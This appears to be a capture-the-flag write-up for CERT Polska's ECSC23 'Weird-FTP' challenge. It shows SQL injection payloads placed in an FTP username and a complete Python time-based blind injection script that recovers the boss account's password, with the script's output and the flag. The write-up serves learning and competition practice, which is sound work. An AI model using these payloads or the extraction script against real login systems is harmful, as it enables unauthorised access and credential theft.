# [web - Weird-FTP](https://hack.cert.pl/challenge/weird-ftp)

I use the auditor account in order to get some information:
```bash
curl "ftp://auditor:8555998981517280@ftp.ecsc23.hack.cert.pl:5005/"

# -rw-r--r--   1 root     root          125 Jul 14 11:31 AUDIT_PLAN.TXT
# -rw-r--r--   1 root     root          806 Jul 14 11:31 dbschema.sql
```
```bash
curl "ftp://auditor:8555998981517280@ftp.ecsc23.hack.cert.pl:5005/dbschema.sql"
```
```sql
#
# TABLE STRUCTURE FOR: employees
#

DROP TABLE IF EXISTS `employees`;

CREATE TABLE `employees` (
  `id` int(9) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `home_dir` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

# All passwords are 16 digits, letters are not used because they could not be entered in case we want to use pin-pads for login
# Passwords provided below are examples.
INSERT INTO `employees` (`id`, `username`, `password`, `home_dir`) VALUES (1, 'boss', '0000000000000000', '/home/boss');
INSERT INTO `employees` (`id`, `username`, `password`, `home_dir`) VALUES (2, 'auditor', '0000000000000000', '/home/auditor');
```
I find out that there is an another account with username `boss`.

I check if the username is injectable using `SLEEP` function:
```bash
curl "ftp://auditor'%20UNION%20SELECT%20SLEEP(2)%3B%20--%20:8555998981517280@ftp.ecsc23.hack.cert.pl:5005/" | time

#   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
#                                  Dload  Upload   Total   Spent    Left  Speed
#   0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0
# curl: (56) response reading failed (errno: 36)
```
Request took exactly 2 seconds so it is. Based on this I created a Python script that uses blind sql injection technique in order to get the password to the boss' account:
```python
import subprocess
import urllib.parse
from time import time


password = ''
guess = 0
i = 1

while True:
    sql = f"' AND 1=IF(SUBSTRING(password,{i},1)='{guess}',SLEEP(1),'test'); -- "
    sql = urllib.parse.quote(sql)

    st = time()
    subprocess.run(
        ['curl', f'ftp://boss{sql}:0000000000000000@ftp.ecsc23.hack.cert.pl:5005/'], capture_output=True)
    diff = time() - st

    if diff > 1:
        password += str(guess)
        print(password)
        i += 1
        guess = 0
    else:
        guess += 1

    if guess > 9:
        print('password:', password)
        break

# output:    

# 7
# 78
# 789
# 7897
# 78978
# 789781
# 7897812
# 78978129
# 789781291
# 7897812918
# 78978129180
# 789781291802
# 7897812918028
# 78978129180281
# 789781291802819
# 7897812918028196
# password: 7897812918028196
```
Now having the password I'm getting the flag:
```bash
curl "ftp://boss:7897812918028196@ftp.ecsc23.hack.cert.pl:5005/"
# -rw-r--r--   1 root     root           41 Jul 14 11:31 flag.txt
```

```bash
curl "ftp://boss:7897812918028196@ftp.ecsc23.hack.cert.pl:5005/flag.txt"
```

### Flag
```
ecsc23{863b2b472ee544109a7b066256df0ea5}
```
